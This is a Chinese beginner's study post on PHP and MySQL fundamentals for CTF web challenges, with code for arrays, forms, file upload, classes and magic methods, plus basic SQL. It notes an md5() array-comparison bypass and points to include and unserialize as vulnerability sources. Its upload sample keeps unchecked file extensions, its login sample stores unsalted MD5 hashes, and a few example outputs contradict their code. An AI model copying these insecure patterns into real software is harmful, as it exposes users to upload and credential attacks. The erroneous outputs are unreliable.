判断变量是否为空\nmd5(); 32位加密字符串\ninclude(); php包含文件\ninclude_once(); php包含文件\nrequire(); php包含文件\nrequire_once(); php包含文件\nserialize() 序列话函数\nunserialize() 反序列话函数\n这些函数是 PHP 安全的 “高频考点”，几乎所有涉及 PHP 的 CTF Web 题目（如文件包含、反序列化、逻辑漏洞、哈希绕过等）都会用到它们的特性。理解这些函数的工作原理、参数处理方式及潜在漏洞点，是解决 PHP 相关 Web 题目的基础:\n哈希比较漏洞：利用 md5() 对数组处理返回 null 的特性（如 md5([]) == md5([]) 为 true）绕过验证。 include()/include_once()/require()/require_once()是 PHP 中文件包含漏洞的直接成因，在 CTF 中极为常见 序列化与反序列化函数（serialize()/unserialize()）：反序列化漏洞关键 Web基础 PHP数组 PHP数组是一种数据结构，用于存储键值对集合，其中每个键可以是整数索引或字符串索引，而值可以是任何类型的数据。\n创建数组：array() 函数用于创建数组 [ ]\u0026mdash;-php版本5.4+\n1 arry();//$声明变量，在括号里面赋予值 PHP索引数组 这⾥有两种创建索引数组的⽅法：⾃动分配 ID 键（ID 键总是从 0 开始）\n1 2 $a=array(\u0026#34;蓝⾊\u0026#34;,\u0026#34;红⾊\u0026#34;,\u0026#34;⿊⾊\u0026#34;);//⾃动分配ID键，从0开始 echo $a[0],\u0026#34;\u0026lt;br\u0026gt;\u0026#34;,$a[1],\u0026#34;\u0026lt;br\u0026gt;\u0026#34;,$a[2];//输出 人工分配ID键：\n1 2 3 4 $cars[0]=\u0026#34;蓝⾊\u0026#34;;//⼿动分配下标，也是从0开始 $cars[1]=\u0026#34;红⾊\u0026#34;; $cars[2]=\u0026#34;⿊⾊\u0026#34;; echo $a[0],\u0026#34;\u0026lt;br\u0026gt;\u0026#34;,$a[1],\u0026#34;\u0026lt;br\u0026gt;\u0026#34;,$a[2];//输出 PHP关联数组 下标是字符串，关联数组的键值对之间存在明确的对应关系。\n1 2 3 4 $ren = array( \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;xiaolin\u0026#39;, \u0026#39;age\u0026#39; =\u0026gt; 18 ); 添加或修改元素：\n1 2 $ren[\u0026#39;phone\u0026#39;] = \u0026#39;13800138000\u0026#39;; // 添加新元素 $ren[\u0026#39;age\u0026#39;] = 26; // 修改已有元素 获取数组的长度 ——count()函数 count() 函数用于返回数组的长度（元素的数量）\n1 2 3 4 \u0026lt;?php $a=array(\u0026#34;蓝⾊\u0026#34;,\u0026#34;红⾊\u0026#34;,\u0026#34;⿊⾊\u0026#34;);//⾃动分配下标，从0开始 echo count($a); //输出数组⻓度 ；；；输出结果为3 ?\u0026gt; 遍历数值数组foreach：可以使用for循环以及foreach循环。\n语法：遍历$array数组中的每个元素\n1 2 3 foreach ($array as $value){ 要执⾏代码; } 示例：\n1 2 3 4 5 6 \u0026lt;?php $a=array(\u0026#34;蓝⾊\u0026#34;,\u0026#34;红⾊\u0026#34;,\u0026#34;⿊⾊\u0026#34;); //定义数组 foreach ($a as $value){ //使⽤foreach遍历数组，将a数组的值赋值给$value echo $value,\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; //再输出$value值 ?\u0026gt; PHP表单操作 用户提交数据通常是使用表单进行提交，也可以使用网址中的参数传递数据，这些数据通过HTTP请求的方式发送，使web服务器获取。\nPHP提供了预定义的超全局变量，用来获取HTTP请求信息。\n$_GET（通过url接收）\n$_POST（字符表单接收）\n$_FILES（文件接收）\n（超全局变量）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?php if ($_POST) { // print_r($_POST); // 数据处理 $username = trim($_POST[\u0026#34;username\u0026#34;]); $password = md5($_POST[\u0026#34;password\u0026#34;]); // echo $password; // 保存到txt中 账号和密码之间用空格隔开 换行符 file_put_contents(\u0026#34;user.txt\u0026#34;, $username . \u0026#34; \u0026#34; . $password . \u0026#34;\\n\u0026#34;); } ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;post\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;post页面\u0026lt;/h1\u0026gt; \u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; id=\u0026#34;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;登录\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 字符串处理函数\nltrim() 删除字符串左边的空白字符，或指定字符\nrtrim() 删除字符串右边的空白字符，或指定字符\ntrim() 删除字符串两边的空白字符，或指定字符\nstrlen() 获取字符串长度\nsubstr() 字符串截取\nstr_replace() 字符串替换\nstrtolower() 将字符串转换为小写字母\nstrtoupper() 将字符串转换为大写字母\nstrip_tags() 删除字符串中HTML XML PHP JS 标签\nhtmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体字符\nPHP文件上传流程：\nPHP文件上传功能： 文件上传必要条件\n（1）method属性：表单提交方式必须为POST\n（2）enctype属性：form表单属性，主要是规范表单数据的编码方式enctype= \u0026ldquo;multipart/form-data\u0026rdquo;\n$_FILES超级全局变量作用是存储各种与上传文件有关的信息;\n$_FILES是一个二维数组，数组中共有5项：\n1、$_FILES[\u0026ldquo;userfile\u0026rdquo;][\u0026ldquo;name\u0026rdquo;] 上传文件的名称，客户端机器文件的原名称。\n2、$_FILES[\u0026ldquo;userfile\u0026rdquo;][\u0026ldquo;type\u0026rdquo;]\n上传文件的类型，文件的 MIME 类型，需要浏览器提供该信息的支持，例如“image/gif”。\n3、$_FILES[\u0026ldquo;userfile\u0026rdquo;][\u0026ldquo;size\u0026rdquo;]\n上传文件的大小, 以字节为单位，已上传文件的大小，单位为字节。\n4、$_FILES[\u0026ldquo;userfile\u0026rdquo;][\u0026ldquo;tmp_name\u0026rdquo;]\n文件上传后在服务器端储存的临时文件名，文件被上传后在服务端储存的临时文件名。\n5、$_FILES[\u0026ldquo;userfile\u0026rdquo;][\u0026ldquo;error\u0026rdquo;] 文件上传相关的错误代码0 1 2 3 4\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 \u0026lt;?php header(\u0026#39;Content-Type: text/html; charset=utf-8\u0026#39;); if ($_POST) { // 更改原⽂件名字 $name = $_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]; $tmp_name = $_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $ext = substr(strrchr($name, \u0026#34;.\u0026#34;), 1); // 取后缀名 // ⽣成随机的⽂件名 $file_name = time() . rand() . \u0026#34;.\u0026#34; . $ext; // 永久保存下来 $dir = \u0026#34;upload\u0026#34;; if (!is_dir($dir)) { mkdir($dir, 0777, true); // 递归创建 } $path = $dir . \u0026#34;/\u0026#34; . $file_name; // upload/1234567890.1234567890.txt if (!move_uploaded_file($tmp_name, $path)) { // 把临时⽂件 永久保存下来 echo \u0026#34;上传失败\u0026#34;; exit; } echo \u0026#34;上传成功\u0026#34;; } ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;⽂件上传\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;⽂件上传\u0026lt;/h1\u0026gt; \u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; id=\u0026#34;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;上传\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 注：userfile只是一个占位符，代表文件上传表单元素的名字; 因此这个值将根据你所给定的名称有所不同。\nPHP面向对象 PHP面向对象是一种编程思想，面向对象是一种以对象（Object）为中心的编程思想。面向对象编程更注重对问题的抽象和封装，通过将问题分解为一系列相互协作的对象来实现程序的功能。（很类似Python的编程思想）\nphp类和对象：\n类是抽象的概念，仅仅是模板。用来描述具有相同属性和方法的对象的集合。比如： \u0026ldquo;人\u0026quot;是一个类。\n对象是类的实例，是某一个具体的事物 ，如 “黄结伟老师”则是具体存在的一个对象\n例：类：人类（抽象事物）\n对象： 黄结伟老师、UP主本人（实实在在存在的东西）\n类修饰符\npublic（公有）\n特性：在任何范围可访问（类内部、⼦类、类外部）\nprotected（保护）\n特性：仅限类内部和⼦类访问\nprivate（私有）\n特性：仅定义该成员的类内部可访问\n创建对象和类 在PHP中，使用class关键字来定义一个类class MyClass\n{\n// 类的属性和方法\n}\n以下实例中创建了⼀个名为 Fruit 的类，包含两个属性($name 和 $color),以及两个⽤于设置$name 属性的⽅法 set_name()。在类中，变量称为属性，函数称为⽅法！$this 关键字引⽤当前对象，并且只在⽅法内部可⽤：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php class Fruit { // 属性 public $name; public $color; // ⽅法 function set_name($name) { $this-\u0026gt;name = $name; } } ?\u0026gt; 类可以包含属性（变量）和方法（函数）\n属性用于存储数据，而方法用于执行操作\nnew关键字直接跟类名来创建对象\n1 2 3 4 5 6 //创建了两个对象分别是 $apple 和 $banana $apple = new Fruit(); $banana = new Fruit(); //通过创建的对象调⽤ Fruit 类中的 set_name ⽅法来修改属性值 $apple-\u0026gt;set_name(\u0026#39;Apple\u0026#39;); $banana-\u0026gt;set_name(\u0026#39;Banana\u0026#39;); PHP魔术方法 PHP魔术方法（Magic Methods）是一类特殊的方法，它们在PHP中具有特定的命名和功能，能够在特定情况下自动被调用。\n命名规则：魔术方法通常以两个下划线（__）开头，后跟方法名称，如__construct()、__destruct()等。\n它与常规PHP方法的区别？ 与普通方法不同，魔术方法不需要显式调用，而是由PHP解释器在特定时机自动触发。\n构造方法__construct() new 定义与用途\n通常构造⽅法被⽤来执⾏⼀些有⽤的初始化任务，如对成员属性在创建对象时赋予初始值。声明格式：\n1 2 3 function __constrct([参数列表]){ ⽅法体 //通常⽤来对成员属性进⾏初始化赋值 } construct()是一个特殊的方法，当创建新对象时，该方法会自动被调用，用于初始化对象的状态或执行其他必要的操作。参数列表 construct()方法可以接受任意数量的参数，这些参数用于在创建对象时传递初始化数据。\n使用示例\n在类中定义construct()方法，并在创建对象时传递参数来初始****化对象的状态。 注意事项 如果类中定义了construct()方法，则必须在创建对象时提供所需的参数，否则会导致错误。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php class Person{ public $name; public $age; public $sex; /** * 显示声明⼀个构造⽅法且带参数 */ public function __construct($name=\u0026#34;\u0026#34;, $sex=\u0026#34;男\u0026#34;, $age=22){ $this-\u0026gt;name = $name; $this-\u0026gt;sex = $sex; $this-\u0026gt;age = $age; } public function say(){ echo \u0026#34;我叫：\u0026#34; . $this-\u0026gt;name . \u0026#34;，性别：\u0026#34; . $this-\u0026gt;sex . \u0026#34;，年龄：\u0026#34; . $thi s-\u0026gt;age; } } //创建对象$Person1 且不带任参数 $Person1 = new Person(); echo $Person1-\u0026gt;say(); //输出:我叫：，性别：男，年龄：27 //创建对象$Person2 且带参数“⼩明” $Person2 = new Person(\u0026#34;⼩明\u0026#34;); echo $Person2-\u0026gt;say(); //输出：我叫：张三，性别：男，年龄：27 拆构方法__destruct()\n定义与用途\ndestruct()是另一个特殊的方法，当对象不再被引用或脚本执行结束时，该方法会自动被调用，用于执行清理操作，如释放资源、关闭数据库连接等。 参数列表 destruct()方法不接受任何参数。\n1 2 3 function __destruct(){ //⽅法体 } 使用示例\n在类中定义__destruct()方法，并在其中执行必要的清理操作。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php class Person{ public $name; public $age; public $sex; public function __construct($name=\u0026#34;\u0026#34;, $sex=\u0026#34;男\u0026#34;, $age=22){ $this-\u0026gt;name = $name; $this-\u0026gt;sex = $sex; $this-\u0026gt;age = $age; } public function say(){ echo \u0026#34;我叫：\u0026#34;.$this-\u0026gt;name.\u0026#34;，性别：\u0026#34;.$this-\u0026gt;sex.\u0026#34;，年龄：\u0026#34;.$this-\u0026gt;age; } public function __destruct(){ echo \u0026#34;我觉得我还可以再抢救⼀下，我的名字叫\u0026#34;.$this-\u0026gt;name; } } $Person = new Person(\u0026#34;⼩明\u0026#34;); unset($Person); //销毁上⾯创建的对象$Person 不过说实话：⼀般来说，析构⽅法在 PHP 中并不是很常⽤，它属类中可选择的⼀部分，通常⽤来完成⼀些在对象销毁前的清理任务。\n__sleep()方法 序列化 serialize () php序列化：将PHP数据结构转换为可存储/传输的字符串格式；序列化函数serialize()。\n触发时机：当对象被序列化自动调用。\n功能：该方法可以清理对象，并返回一个包含所有应被序列化的属性名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_WARNING级别的错误。\n这种方法不接受任何参数!!\n返回值：返回一个包含所有需要被序列化的属性名称的数组。\n在对象被序列化之前，此⽅法会被调⽤。可以在这⾥做⼀些清理⼯作，⽐如关闭数据库连接，或者决定哪些对象属性应该被序列化。\n__wakeuo()方法 unserialize () php反序列化：将序列化字符串还原为原始PHP数据结构；反序列化函数unserialize()。\n触发时机：当反序列化一个对象时自动调用。\n功能：该方法可以重新建立数据库连接，或执行其它初始化操作。它不需要任何参数，也没有任何返回值。\n但要注意：如果在反序列化过程中，__wakeup() 方法的执行抛出了一个异常，那么反序列化操作会失败，并抛出该异常。\n**在对象被反序列化之后，此⽅法会被调⽤。这⾥可以⽤来重新建⽴那些在__sleep()中被断开的链接，⽐如重新打开数据库连接。\nPython基础 Python的学习可以移步到我的文章：Python 学习\nPython介绍 Python 是⼀种解释型、⾯向对象、动态数据类型的⾼级编程语⾔。\n它被设计为可读性强、 简洁且易于学习，具有⾼效的高级数据结构，并且⽀持简单有效的⾯向对象编程。\nPython官⽹：https://www.python.org\nWeb安全问题 MySQL数据库安全基础 数据库概述 1、数据库是什么？\n存储数据的地方、DB：数据库（Database）\n它是统一管理的、长期储存在计算机内的、有组织的相关数据的集合。数据库的基本特征包括：数据按一定的数据模型组织、描述和储存；数据间联系密切、冗余度较小；数据独立性较高；易扩展；可为各种用户共享。\n2、为什么要用数据库？\n因为应用程序产生的数据是在内存中的，如果程序退出或者是断电了，则数据就会消失。使用数据库是为了能够永久保存数据。当然这里指的是非内存数据库。\n3、用普通文件存储行不行？\n把数据写入到硬盘上的文件中，当然可以实现持久化的目标，但是不利于后期的检索和管理等。\n4、MySQL、Oracle、SqlServer是什么？\nMySQL、Oracle、SqlServer都是数据库管理系统（DBMS，Database ManagementSystem）是一种操纵和管理数据库的大型软件，例如建立、使用和维护数据库。\n5、SQL是什么？\nSQL是结构化查询语言（Structure Query Language），专门用来操作/访问数据库的通用语言。\nMySQL数据库管理系统 在互联网行业，MySQL数据库毫无疑问已经是最常用的数据库。MySQL数据库由瑞典MySQL AB公司开发。公司名中的“AB”是瑞典语“aktiebolag”股份公司的首字母缩写。该公司于2008年1月16号被Sun（Stanford University Network）公司收购。然而2009年，SUN公司又被Oracle收购。因此，MySQL数据库现在隶属于Oracle（甲骨文）公司。MySQL中的“My”是其发明者（Michael Widenius，通常称为Monty）根据其女儿的名字来命名的。对这位发明者来说，MySQL数据库就仿佛是他可爱的女儿。\n关系型数据库和非关系数据库 MySQL、Oracle、Microsoft SQL Server 和IBM DB2都是关系型数据库系统(database system)。除了管理数据，一个这样的系统还包括用来管理各种关系数据库的程序。通过SQL结构化查询语言来存取、管理关系型数据库的数据。\nMongoDB、Redis、Elasticsearch等是非关系型数据库管理系统。\n关系型数据库，采用关系模型来组织数据，简单来说，关系模型指的就是二维表格模型。类似于Excel工作表。\n非关系型数据库，可看成传统关系型数据库的功能阉割版本，基于键值对存储数据，通过减少很少用的功能，来提高性能。\nMysql服务端架构：\n1、数据库管理系统（最外层）：DBMS，专门管理服务器端的所有内容。\n2、数据库（第二层）：Database，专门用于存储数据的仓库（可以有很多个）。\n3、二维数据表（第三层）：Table，专门用于存储具体实体的数据。\n4、字段（第四层）：Field，具体存储某种类型的数据（实际存储单元）。\nMySQL的优点 主要的优势有如下几点：\n可移植性：MySQL数据库几乎支持所有的操作系统，如Linux、Solaris、FreeBSD、Mac和Windows。\n免费：MySQL的社区版完全免费，一般中小型网站的开发都选择 MySQL 作为网站数据库。\n开源：2000 年，MySQL公布了自己的源代码，并采用GPL（GNU General Public License）许可\n协议，正式进入开源的世界。开源意味着可以让更多人审阅和贡献源代码，可以吸纳更多优秀人才的代码成果。\n关系型数据库：MySQL可以利用标准SQL语法进行查询和操作。\n智榜样速度快、体积小、容易使用：与其他大型数据库的设置和管理相比，其复杂程度较低，易于学习。\nMySQL的早期版本（主要使用的是MyISAM引擎）在高并发下显得有些力不从心，随着版本的升级\n优化（主要使用的是InnoDB引擎），在实践中也证明了高压力下的可用性。从2009年开始，阿里的“去IOE”备受关注，淘宝DBA团队再次从Oracle转向MySQL，其他使用MySQL数据库的公司还有Facebook、Twitter、YouTube、百度、腾讯、去哪儿、魅族等等，自此，MySQL在市场上占据了很大的份额。\n安全性和连接性：十分灵活和安全的权限和密码系统，允许基于主机的验证。连接到服务器时，所有的密码传输均采用加密形式，从而保证了密码安全。由于MySQL是网络化的，因此可以在因特网上的任何地方访问，提高数据共享的效率。\n丰富的接口：提供了用于C、C++、Java、PHP、Python、Ruby和Eiffel、Perl等语言的API。\n灵活：MySQL并不完美，但是却足够灵活，能够适应高要求的环境。同时，MySQL既可以嵌入到应用程序中，也可以支持数据仓库、内容索引和部署软件、高可用的冗余系统、在线事务处理系统等各种应用类型。\nMySQL最重要、最与众不同的特性是它的存储引擎架构，这种架构的设计将查询处理（QueryProcessing）及其他系统任务（Server Task）和数据的存储/提取相分离。这种处理和存储分离的设计可以在使用时根据性能、特性，以及其他需求来选择数据存储的方式。MySQL中同一个数据库，不同的表格可以选择不同的存储引擎。其中使用最多的是InnoDB 和MyISAM，MySQL5.5之后InnoDB是默认的存储引擎。\n针对不同用户，MySQL提供三个不同的版本：\n（1）MySQL Enterprise Server（企业版）：能够以更高的性价比为企业提供数据仓库应用，该版本需要付费使用，官方提供电话技术支持。\n（2）MySQL Cluster（集群版）：MySQL 集群是 MySQL 适合于分布式计算环境的高可用、高冗余版本。它采用了 NDB Cluster 存储引擎，允许在 1 个集群中运行多个 MySQL 服务器。它不能单独使用，需要在社区版或企业版基础上使用。\n（3）MySQL Community Server（社区版）：在开源GPL许可证之下可以自由的使用。该版本完全免费，但是官方不提供技术支持。本书是基于社区版讲解和演示的。在MySQL 社区版开发过程中，同时存在多个发布系列，每个发布处在不同的成熟阶段。\nMySQL5.7（RC）是当前稳定的发布系列RC（Release Candidate候选版本）版只针对严重漏洞修复和安全修复重新发布，没有增加会影响该系列的重要功能。从MySQL 5.0、5.1、5.5、5.6直到5.7都基于5这个大版本，升级的小版本。5.0版本中加入了存储过程、服务器端游标、触发器、视图、分布式事务、查询优化器的显著改进以及其他的一些特性。这也为MySQL 5.0之后的版本迈向高性能数据库的发展奠定了基础。 MySQL8.0.26（GA）是最新开发的稳定发布系列。GA（General Availability正式发布的版本）是包含新功能的正式发布版本。这个版本是MySQL数据库又一个开拓时代的开始。 数据库管理工具 Mysql服务可以本地连接（记得开启mysql服务！！），用终端或者其它图像化工具（如PHPstudy、Navicat）\nNavicat可以连接到MySQL服务器，进行数据库的创建、修改、删除等操作。\n它支持数据表的创建、修改、删除以及数据的增删改查等操作。Navicat还提供了可视化的查询构建工具，使得查询操作更加直观和方便。\n现在我来做一个粗略的介绍，这个数据库里面的东西的含义，以图形化界面Navicat为例：\n连接好mysql后，我们看到一个\n大致是这样，有些人数据库比较多，看自己之前是否有涉及到这方面应用可能会下载过一些定西，比如pikachu，我这里都是默认的数据库。\n查看数据表：\n以SCHEMATA为例：\n可以发现这很像excel表格，有表单有字段数据等，前文介绍了数据库，大概就是这样储存的；再细心发现这好像是上上一张图的一些数据库的名字，这个板块其实储存的是数据库的表名。\n来，我们看到TABLES这一张表：\n晕了晕了\u0026hellip;\u0026hellip;这么多。\n看到第三列，这其实是数据库表名相关对应的TABLES表；第二列就是名子，在SCHEMATA的表看到。\n看到COLUMNS：\n第二列存放的是数据库名；第三列是存放的是表名；第四列存放的就是跟字段名字相关的名字。\n幸运的是，如果你能坚持看到这里，不免会像我一样有疑惑：（我为什么要写这Mysql）我为什么要看这段文章，感觉跟CTF、攻防、渗透好像关系不大啊\u0026hellip;当我看回自己这篇文章也会觉得，其实对Mysql等数据库来说，这方面安全也需要多加在意的，这就是数据库安全，你耐心学，去了解这些Mysql等数据库知识，这也是以便你后面进行SQL注入学习、查询打下的一个基础，切忌速通、一把梭！慢工出细活，了解本质才能赢下去。\n大家只需要多关注一下这三个表：COLUMNS、TABLES、SCHEMATA。其它的表点进去看一下浅浅了解下就好。\n接下来我们倒回去查看mysql数据库中的user表：\n顺便打开phpstudy，对照一下：\n可以看到数据库表上有个root，和我的小皮界面上的root对应上了，我这里没有打开，你自己尝试的话可以发现是有个IP地址在上面，还有主机名，这都是mysql所记录名单下的数据。可以知道user表下存储的就是用户的权限数据、密码、主机名还有IP。\n这很可怕，意味着在实际情况中，数据库安全做得不到位得话被入侵就意味着数据被泄露。\n翻到performance_schema数据库：\n这个数据库内容包含得是诊断数据库的问题、报错，语句执行得时间，类似于日志那样的。\n如果你是打算走电子取证方向的话，这个地方你后面会接触的比较多。\n总结：主要还是关注performance_schema、mysql、information_schema这三个系统数据库。\n数据库数据类型 是指MySQL数据库中用于定义表的列时可以指定的数据类型，它们决定了列中可以存储什么类型的数据。MySQL支持多种数据类型，每种数据类型都有其特定的用途和限制。\n数值类型 类型 存储（字节） 有符号数值取值范围 无符号数值取值范围 TINYINT 1 -128 ~ 127 0 ~ 255 SMALLINT 2 -32768 ~ 32767 0 ~ 65535 MEDIUMINT 3 -8388608 ~ 8388607 0 ~ 16777215 INT 4 -2147483648 ~ 2147483647 0 ~ 4294967295 BIGINT（整数值超过int时使用） 8 -2^63 ~~ (2^63 -1) 0 ~ 2^64-1 浮点数类型 FLOAT：占用4个字节，用于表示单精度浮点数值。\nDOUBLE：占用8个字节，用于表示双精度浮点数值。（小数点后的数字更多，内存空间也会更多）\nDECIMAL：用于表示高精度的小数，其精度和计数方法可以指定，以适应特定的需求。（小数点后位更多，一般银行使用的较多）\n日期和时间类型 类型 大小（bytes） 范围 格式 用途 DATE 3 1000-01-01/9999-12-31 YYYY-MM-DD 日期值 TIME 3 -838:59:59/838:59:59 HH:MM:SS 时间值或持续时间 YEAR 1 1901/2155 YYYY 年份值 DATETIME 8 1000-01-01 00:00:00\u0026rsquo; 到 \u0026lsquo;9999-12-31 23:59:59 YYYY-MM-DD\nhh:mm:ss 混合日期和时间值 TIMESTAMP 4 1970-01-01 00:00:01\u0026rsquo; UTC 到 \u0026lsquo;2038-01-19 03:14:07 YYYY-MM-DD\nhh:mm:ss 混合日期和时间值，时间戳 字符串类型 类型 大小 用途 CHAR 0-255 bytes 定长字符串 VARCHAR 0-65535 bytes 变长字符串 TINYBLOB 0-255 bytes 不超过 255 个字符的二进制字符串 TINYTEXT 0-255 bytes 短文本字符串 BLOB 0-65 535 bytes 二进制形式的长文本数据 TEXT 0-65 535 bytes 长文本数据 MEDIUMBLOB 0-16 777 215 bytes 二进制形式的中等长度文本数据 MEDIUMTEXT 0-16 777 215 bytes 中等长度文本数据 LONGBLOB 0-4 294 967 295 bytes 二进制形式的极大文本数据 LONGTEXT 0-4 294 967 295 bytes 极大文本数据 客户端使用演示（终端命令行） 接下来可以用mysql命令去字节实操一下：\n数据库 1、查看所有数据库（分号；别漏）\n1 show databases; 可以发现这个正是我们在navicat上看到的界面，只不过这是终端界面比较枯燥。\n2、创建自己的数据库\n1 2 3 4 create database 数据库名; #创建zbydb数据库 create database zbydb; 3、删除数据库\n1 drop database 数据库名; 1 2 #删除zbydb数据库 drop database zbydb; 4、使用自己的数据库\n1 2 3 4 use 数据库名; #使用zbydb数据库 use zbydb; 说明：如果没有使用use语句，后面针对数据库的操作也没有加“数据名”的限定，那么会报“ERROR 1046(3D000): No database selected”（没有选择数据库）\n使用完use语句之后，如果接下来的SQL都是针对一个数据库操作的，那就不用重复use了，如果要针对另一个数据库操作，那么要重新use。\n数据表 1、查看某个库的所有表格\n1 2 show tables; #要求前面有use语句 show tables from 数据库名; 2、创建新的表格\n1 2 3 4 create table 表名称( 字段名 数据类型, 字段名 数据类型 ); 说明：如果是最后一个字段，后面就用加逗号，因为逗号的作用是分割每个字段。\n1 2 3 4 5 #创建学生表 create table student( id int, name varchar(20) #说名字最长不超过20个字符 ); 3、查看定义好的表结构\n1 2 desc 表名称; desc student; 4、添加一条记录\n1 2 3 4 5 insert into 表名称 values(值列表); #添加两条记录到student表中 insert into student values(1,\u0026#39;张三\u0026#39;); insert into student values(2,\u0026#39;李四\u0026#39;); 5、查看一个表的数据\n1 select * from 表名称; 6、删除表\n1 drop table 表名称; 1 2 #删除学生表 drop table student; 可视化客户端 前面介绍了通过命令行来创建数据库和数据表，除此之外，还可以借助MySQL图形化工具，而且这种方式更加简单、方便。下面以SQLyog图形化工具为代表展开介绍。\n在前面已经介绍过可视化数据库使用，在此只要粗略过一遍就好。\n数据库 以查看所有数据库的方式登录连接成功后，进入主界面，接下来正式创建数据库。\n步骤1：在主界面左边“数据库对象导航窗口”的空白处右键单击鼠标弹出快捷菜单，选择“新建数据库”菜单项。\n步骤2：填写新数据库的基本信息。一般只需填写数据库名称，例如“test”，字符集和排序规则有默认选项。如果有特殊要求，也可以选择自己需要的字符集和校对规则，然后点击“创建”按钮。\n步骤3：此时数据库创建成功。\n步骤4：数据库创建成功之后，可以查看或修改数据库属性。选择“myschool”数据库，右键单击鼠标弹出快捷菜单，选择“编辑数据库”菜单选项，就可以查看或修改数据库属性。\n数据表 数据库创建成功之后，就可以在这个数据库下面创建表了。\n步骤1：选择“myschool”数据库下的“表”对象，右键单击鼠标弹出快捷菜单，选择“新建表”菜单项。\n步骤2：点击“新建表”后，在新表的创建页面填写表名称和表的字段等属性信息。例如表名称为“tb_student”，并添加两个字段，一个是int类型的sid，一个是varchar(20)类型的sname，分别表示学生编号和学生姓名。\nSQL语句 SQL：结构化查询语言，（Structure Query Language），专门用来操作/访问数据库的通用语言。\nSQL的分类 DDL语句：数据定义语句（Data Define Language），例如：创建（create），修改（alter），删除（drop）等。\nDML语句：数据操作语句，例如：增（insert)，删（delete），改（update），查（select）。\n因为查询语句使用的非常的频繁，所以很多人把查询语句单拎出来一类，DQL（数据查询语言），DR（获取）L。\nDCL语句：数据控制语句，例如：grant，commit，rollback等。\n其他语句：USE语句，SHOW语句，SET语句等。这类的官方文档中一般称为命令。\nSQL语法规范 （1）mysql的sql语法不区分大小写\n1、数据库的表中的数据是否区分大小写。这个的话要看表格的字段的数据类型、编码方式以及校对规则。\nci（大小写不敏感），cs（大小写敏感），_bin（二元，即比较是基于字符编码的值而与language无关，区分大小写）。\n2、sql中的关键字，比如：create,insert等，不区分大小写。但是大家习惯上把关键字都“大写”。\n（2）命名时：尽量使用26个英文字母大小写，数字0-9，下划线，不要使用其他符号。\n（3）建议不要使用mysql的关键字等来作为表名、字段名、数据库名等，如果不小心使用，请在SQL语句中使用“`”（飘号）引起来。\n（4）数据库和表名、字段名等对象名中间不要包含空格。\n（5）同一个mysql软件中，数据库不能同名，同一个库中，表不能重名，同一个表中，字段不能重名。\nSQL脚本中如何加注释 单行注释：#注释内容（mysql特有的） 单行注释：\u0026ndash;空格注释内容 其中\u0026ndash;后面的空格必须有 多行注释：/* 注释内容 */ 1 2 3 4 5 6 7 8 9 create table tt( id int, #编号 `name` varchar(20), -- 姓名 gender enum(\u0026#39;男\u0026#39;,\u0026#39;女\u0026#39;) /* 性别只能从男或女中选择一个， 不能两个都选，或者选择男和女之外的 */ ); mysql脚本中的标点符号 mysql脚本中标点符号的要求如下：\n本身成对的标点符号必须成对，例如：()，\u0026rsquo;\u0026rsquo;，\u0026quot;\u0026quot;。 所有标点符号必须英文状态下半角输入方式下输入。 DDL 在你创建好数据库后，你肯定是要想有搜索功能的，这时查询功能就体现出来了，以下是终端Mysql的命令：\n创建表：\n1 CREATE TABLE 修改表：\n1 ALTER 删除表：\n1 DROP 接下来我用navicat来演示：\n选择数据库（我以我的Mysql为例）后创建好查询表。\n这就是一个面板，很像一些我们经常用的vscode、pycharm那样的编程界面，这里面就是给它编写sql语言的。\n\u0026hellip;\u0026hellip;至于怎么编写我就不演示了，可以自己试一试，参考SQL语法编写。\n写好语句后Ctrl+S保存，起个名字，我这里是起666：\nDQL 